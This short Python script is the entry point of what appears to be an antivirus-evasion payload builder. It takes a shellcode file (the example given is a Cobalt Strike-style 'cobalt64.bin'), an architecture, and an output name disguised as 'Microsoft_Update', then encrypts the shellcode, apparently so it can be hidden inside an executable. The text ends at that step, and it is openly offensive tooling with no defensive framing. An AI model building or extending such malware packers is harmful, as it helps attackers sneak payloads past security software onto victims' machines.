from msfmania import builder, compiler, core, encryption, evasion
import argparse
from os import makedirs, path
from shutil import which
from subprocess import call

payload = ""
arch = ""
filename = ""

if __name__ == '__main__':
    core.banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--payload", help="Select the payload file to use (ex: cobalt64.bin)", required=True)
    parser.add_argument("-a", "--arch", help="Choose payload arch", choices=["32", "64"], required=True)
    parser.add_argument("-o", "--filename", help="Choose the name of the output file (ex: Microsoft_Update)", required=True)

    args = parser.parse_args()

    payload += str(args.payload)
    arch += str(args.arch)
    filename += str(args.filename)

    payload = open(payload, "rb").read()
    encrypted_shellcode, key, nonce = encryption.shellcode_encryption(payload)
